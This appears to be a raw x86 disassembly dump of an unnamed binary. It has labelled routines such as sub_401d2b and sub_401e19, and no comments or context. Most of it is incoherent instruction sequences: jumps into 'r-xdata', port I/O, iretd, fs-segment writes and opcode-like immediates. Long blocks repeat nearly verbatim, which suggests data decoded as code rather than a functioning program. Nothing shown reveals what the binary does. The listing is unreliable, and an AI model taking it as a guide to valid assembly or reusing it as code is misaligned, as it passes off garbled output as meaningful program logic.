movsd [ edi ] [ esi ]
and eax [ eax ]
add esp 0x4
ja r-xdata
jl 0xffffffffffacad2c
jae r-xdata
ja 0xffffffffa3c32cc4
jae r-xdata
ja 0xffffffff89a45965
ja r-xdata
xor ebx 0xff3d870f
call sub_401c7b
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdea2aa
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
pop edx
pop edx
jae r-xdata
jmp 0xffffffffff799dc2
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402099
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jg r-xdata
add eax 0x5abb2979
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92722
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_401d2b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e2de
jg r-xdata
ja 0xcaa0da
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44e50d
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e1e4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9b9f81
pop edx
jge r-xdata
jo 0xffffffff854f77d3
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e299
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcefd8
jae r-xdata
call sub_401e90
jb 0xffffffff81b29b46
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f92f4
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a317
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd2f1b
add esp 0x4
jae r-xdata
jl 0xf3a05c
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_401d36
jae 0xffffffffff43a55b
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7755
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89171f2
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a2b6
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586614ab
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff842897d1
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
jo 0xffffffffa2c12e73
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
jae r-xdata
je 0xffffffffff6da3a3
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_401fd8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a4e3
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_401d2b
add esp 0x4
jae r-xdata
push ecx
push ebx
push ecx
call sub_401e28
xor ebx 0xff1a830f
jo 0x5596748e
call sub_401e19
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c32cc4
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9b9f81
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e1e4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdea2aa
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_401e90
jb 0xffffffff81b29b46
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92722
add esp 0x4
jae r-xdata
jl 0xf3a05c
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e2de
jg r-xdata
ja 0xcaa0da
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f7755
pop edx
jge r-xdata
jo 0xffffffff854f77d3
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e299
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89171f2
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f92f4
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacad2c
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
movsd [ edi ] [ esi ]
and eax [ eax ]
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff842897d1
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_401d36
jae 0xffffffffff43a55b
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6da3a3
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402099
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_401d2b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158a2b6
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44e50d
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffcefd8
jno r-xdata
jge 0xffffffffffa0a317
jge r-xdata
jpe 0x74cd2f1b
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586614ab
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
jo 0xffffffffa2c12e73
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_401fd8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a4e3
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_401d36
push esp
push edi
push esi
push ebp
call sub_401e19
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c32cc4
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9b9f81
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e1e4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdea2aa
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_401e90
jb 0xffffffff81b29b46
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92722
add esp 0x4
jae r-xdata
jl 0xf3a05c
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e2de
jg r-xdata
ja 0xcaa0da
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f7755
pop edx
jge r-xdata
jo 0xffffffff854f77d3
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e299
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89171f2
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f92f4
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacad2c
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
movsd [ edi ] [ esi ]
and eax [ eax ]
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff842897d1
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_401d36
jae 0xffffffffff43a55b
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6da3a3
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402099
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_401d2b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158a2b6
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44e50d
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffcefd8
jno r-xdata
jge 0xffffffffffa0a317
jge r-xdata
jpe 0x74cd2f1b
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586614ab
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
jo 0xffffffffa2c12e73
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_401fd8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a4e3
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_401e19
jg r-xdata
jne r-xdata
and eax 0xae830f
add [ eax ] al
jae r-xdata
and esi 0x89641273
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e1e4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdea2aa
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_401e90
jb 0xffffffff81b29b46
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
xor al [ ecx ]
add [ eax ] al
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92722
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e2de
jg r-xdata
ja 0xcaa0da
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop edx
jge r-xdata
jo 0xffffffff854f77d3
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e299
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f92f4
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c32cc4
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacad2c
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
movsd [ edi ] [ esi ]
and eax [ eax ]
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_401d36
jae 0xffffffffff43a55b
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
or esi 0xff24810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402099
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_401d2b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158a2b6
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jg r-xdata
ja 0xffffffffff9b9f81
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44e50d
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jno r-xdata
and ebx 0x870f4975
pop ecx
jne r-xdata
jbe 0xffcefd8
jae r-xdata
xor esi 0xe681cd75
jno r-xdata
jge 0xffffffffffa0a317
add esp 0x4
jae r-xdata
jl 0xf3a05c
jge r-xdata
jpe 0x74cd2f1b
pop eax
jg r-xdata
jge 0xffffffff894f7755
add [ eax ] al
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89171f2
push 0x81ffffff
out 0x77 al
jne r-xdata
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff842897d1
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586614ab
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6da3a3
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
jo 0xffffffffa2c12e73
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_401fd8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a4e3
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_401e28
jne r-xdata
add esp 0x8
jg 0xf44e2b7
jae r-xdata
ja 0xffffffffa3c32cc4
xchg [ esi - 0x1 ] eax
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9b9f81
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e1e4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdea2aa
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_401e90
jb 0xffffffff81b29b46
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92722
add esp 0x4
jae r-xdata
jl 0xf3a05c
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e2de
jg r-xdata
ja 0xcaa0da
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f7755
add [ eax ] al
pop edx
jge r-xdata
jo 0xffffffff854f77d3
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
